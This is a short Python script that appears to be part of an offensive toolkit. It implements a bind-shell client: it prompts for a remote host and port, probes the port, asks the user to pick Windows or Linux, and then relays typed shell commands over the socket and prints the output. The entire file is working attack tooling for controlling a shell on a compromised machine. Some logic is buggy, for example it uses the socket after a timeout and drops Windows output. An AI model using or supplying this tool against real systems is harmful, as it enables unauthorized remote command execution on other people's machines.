import socket
from socket import timeout
import threading
from termcolor import colored
import sys

def bindshWrapper():
    color_b = colored("[!] ", "red")
    color_c = colored("[*] ", "yellow")
    closed = colored("[CLOSED]", "red")
    listen = colored("[OPEN]", "yellow")

    host = input("[$1] RHOST -> ")
    port = input("[$1] RPORT -> ")
    port = int(port)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((host, port))
    except socket.timeout:
        print(color_b + str(port) + " -- " + closed)
    else:
        print(color_c + str(port) + " -- " + listen)

    
    while True:
        print("\tSelect target OS")
        print("\t[1] Windows")
        print("\t[2] Linux")
        os = input("[$1] Target OS -> ")
        if os == "1":
            cmd = input("\n\n(cmdSh) $ ")
            sock.send(cmd.encode())
            result = sock.recv(1000).strip()
            if not len(result):
                sock.close()
                break
        elif os == "2":
            bash = input("\n\n(bashSh) $ ")
            sock.send(bash.encode())
            result = sock.recv(1000)
            print(result)
            # print(result)
            # if not len(result):
            #     sock.close()
            #     break